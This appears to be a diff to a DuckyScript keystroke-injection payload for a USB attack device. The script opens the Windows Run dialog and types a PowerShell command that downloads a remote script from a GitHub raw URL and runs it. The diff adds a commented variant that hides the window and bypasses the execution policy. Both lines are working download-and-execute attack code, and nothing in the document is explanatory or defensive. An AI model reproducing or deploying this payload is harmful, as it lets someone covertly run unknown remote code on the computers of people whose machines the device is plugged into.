@@ -4,6 +4,7 @@ DELAY 1000
 GUI r
 DELAY 1000
 STRING powershell -NoExit IEX(IWR https://raw.githubusercontent.com/softpiano/fun/refs/heads/main/n00l.ps1)
+#STRING powershell -w hidden -ep bypass IEX(IWR https://raw.githubusercontent.com/softpiano/fun/refs/heads/main/n00l.ps1)
 ENTER
 
 #DELAY 1000
